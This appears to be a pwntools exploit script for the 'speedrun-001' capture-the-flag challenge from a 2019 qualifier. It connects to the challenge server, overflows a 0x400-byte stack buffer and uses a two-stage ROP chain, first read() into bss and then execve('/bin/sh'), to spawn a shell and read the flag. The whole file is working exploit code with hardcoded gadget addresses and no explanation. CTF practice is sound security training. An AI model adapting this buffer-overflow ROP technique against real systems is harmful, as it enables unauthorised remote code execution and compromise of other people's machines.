from pwn import *

conn = remote("speedrun-001.quals2019.oooverflow.io", 31337)
#conn = process("./speedrun-001")

#https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
syscall_ret = 0x00474e65

pop_rax = 0x0045fbb4
pop_rdi = 0x0048e38c
pop_rsi = 0x00421efa
pop_rdx = 0x0044be16

bss = 0x006bc000-0x100

main_addr = 0x400BC1


def trigger_bof(payload):
	conn.recvuntil("Any last words?")
	conn.sendline(payload)

# stage 1. Write "/bin/sh\x00" in the bss area
payload  = "A"*0x400
payload += p64(bss-0x100) 	# sfp
payload += p64(pop_rdi)	+ p64(0)	#  fd  : 0
payload += p64(pop_rsi)	+ p64(bss)	# *buf : bss	
payload += p64(pop_rdx)	+ p64(8)	# size : 8
payload += p64(pop_rax) + p64(0)	# syscall num 0(read)
payload += p64(syscall_ret)
payload += p64(main_addr)	# ret
trigger_bof(payload)

conn.send("/bin/sh\x00")

# stage 2. execve("/bin/sh", NULL, NULL);
payload  = "A"*0x400
payload += p64(0xdeadbeef) 	# sfp
payload += p64(pop_rdi)	+ p64(bss)	# "/bin/sh\x00"
payload += p64(pop_rsi)	+ p64(0)	# NULL
payload += p64(pop_rdx)	+ p64(0)	# NULL
payload += p64(pop_rax) + p64(59)	# syscall num 59(execve)
payload += p64(syscall_ret)
payload += p64(main_addr)	# ret

trigger_bof(payload)

# get shell
conn.recvuntil("A"*0x400)
conn.sendline("/bin/sh;")
conn.sendline("cat flag")

conn.interactive()